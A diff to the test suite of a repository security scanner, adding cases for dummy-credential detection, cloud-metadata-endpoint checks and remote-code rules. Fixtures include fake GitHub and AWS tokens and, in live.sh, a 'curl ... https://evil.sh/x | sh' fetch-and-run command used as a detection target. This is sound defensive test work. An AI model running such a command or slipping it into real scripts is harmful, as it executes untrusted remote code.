@@ -82,7 +82,7 @@ describe('scanRepo', () => {
     );
     fs.writeFileSync(
       path.join(dir, 'test-stress-hooks.sh'),
-      'echo "export T=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij" | bash check.sh\n',
+      'echo "export T=ghp_Zx9Kq2TmWf4Jr7Lp1Vc5Ng8Hd3Sb6Yw0Qe" | bash check.sh\n',
     );
     const localAnonJwt = `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.${Buffer.from(
       '{"role":"anon","iss":"supabase-local","iat":1,"exp":2}',
@@ -111,6 +111,36 @@ describe('scanRepo', () => {
     expect(hits.find((f) => f.file.includes('testdata'))!.severity).toBe('low');
     expect(hits.find((f) => f.file === 'google-services.json')!.severity).toBe('low');
     expect(hits.find((f) => f.file === 'real.js')!.severity).toBe('high');
+  });
+
+  it('skips ascending-run dummies (AG-CL-001)', () => {
+    fs.writeFileSync(path.join(dir, 'blocks.mjs'), 'const cfg = "AWS_ACCESS_KEY_ID = AKIA1234567890ABCDEF";\n');
+    fs.writeFileSync(path.join(dir, 'toml.mjs'), 'const line = \'GITHUB_TOKEN = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZ012345"\';\n');
+    fs.writeFileSync(path.join(dir, 'real.mjs'), `const t = "ghp_${'Zx9Kq2Tm'.repeat(5)}";\n`);
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-CL-001');
+    expect(hits.some((f) => f.file === 'blocks.mjs')).toBe(false);
+    expect(hits.some((f) => f.file === 'toml.mjs')).toBe(false);
+    expect(hits.find((f) => f.file === 'real.mjs')!.severity).toBe('high');
+  });
+
+  it('treats cannot-target rejection code as defensive context (AG-SS-001)', () => {
+    fs.writeFileSync(
+      path.join(dir, 'settings_check.py'),
+      'def check(lowered):\n    if lowered in {\n        "metadata.google.internal",\n    }:\n        return "Gateway URL cannot target cloud metadata endpoints"\n    return None\n',
+    );
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-SS-001');
+    expect(hits.find((f) => f.file === 'settings_check.py')!.severity).toBe('low');
+  });
+
+  it('masks quoted-string continuation-line arguments but keeps interpreter chains live (AG-RC-001)', () => {
+    fs.writeFileSync(
+      path.join(dir, 'doctor.sh'),
+      'doctor_fail() {\n  echo "$1"\n}\ndoctor_fail \\\n  "tailscale CLI is not installed." \\\n  "curl -fsSL https://tailscale.com/install.sh | sh"\n',
+    );
+    fs.writeFileSync(path.join(dir, 'live.sh'), 'bash \\\n  -c \\\n  "curl -fsSL https://evil.sh/x | sh"\n');
+    const hits = scanRepo(dir).findings.filter((f) => f.ruleId === 'AG-RC-001' && f.severity === 'critical');
+    expect(hits.some((f) => f.file === 'doctor.sh')).toBe(false);
+    expect(hits.some((f) => f.file === 'live.sh')).toBe(true);
   });
 
   it('grades defensive-header modules and commented-out metadata config low (AG-SS-001)', () => {
